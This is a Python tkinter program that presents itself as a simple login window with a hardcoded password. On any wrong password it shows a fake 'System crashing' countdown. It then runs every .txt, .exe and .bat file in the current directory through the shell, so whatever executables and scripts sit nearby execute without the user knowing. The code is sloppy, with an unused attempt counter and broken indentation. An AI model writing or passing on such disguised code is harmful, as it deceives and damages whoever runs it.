import tkinter as tk
from tkinter import messagebox
import subprocess
import time

def authenticate():
    name = name_entry.get()
    password = password_entry.get()
    
    if password == 'python':
        messagebox.showinfo("Access Granted", f"Welcome, {name}!")
    else:
        
            messagebox.showerror("Too Many Attempts", "System crashing ...")
            countdown(4)  

def countdown(seconds):
    countdown_label.config(text=f"System crashing in {seconds} seconds")
    if seconds > 0:
        root.after(1000, countdown, seconds - 1)  
    else:
        launch_bye()

import os

def launch_bye():
    countdown_label.config(text="System crashed!")
    current_dir = os.getcwd()
    for filename in os.listdir(current_dir):
        if filename.endswith(".txt"):  
            filepath = os.path.join(current_dir, filename)
            p = subprocess.Popen(filepath, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = p.communicate()
            print(p.returncode)
           
        
        elif filename.endswith(".exe"):  
            filepath = os.path.join(current_dir, filename)
            p = subprocess.Popen(filepath, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = p.communicate()
            print(p.returncode)

        elif filename.endswith(".bat"):  
            filepath = os.path.join(current_dir, filename)
            p = subprocess.Popen(filepath, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = p.communicate()
            print(p.returncode)    
        
       

root = tk.Tk()
root.title("Login")
root.geometry("300x200") 
# Style
bg_color = "#f0f0f0"
font_style = ("Arial", 10)

label_name = tk.Label(root, text="Name:", bg=bg_color, font=font_style)
label_name.grid(row=0, column=0, sticky="e")

name_entry = tk.Entry(root)
name_entry.grid(row=0, column=1)

label_password = tk.Label(root, text="Password:", bg=bg_color, font=font_style)
label_password.grid(row=1, column=0, sticky="e")

password_entry = tk.Entry(root, show="*")
password_entry.grid(row=1, column=1)

attempt_count = tk.IntVar()
attempt_count.set(0)

login_button = tk.Button(root, text="Login", command=authenticate, bg="green", fg="white")
login_button.grid(row=2, columnspan=2, pady=10)

countdown_label = tk.Label(root, text="", bg=bg_color, font=font_style)
countdown_label.grid(row=3, columnspan=2)

root.mainloop()
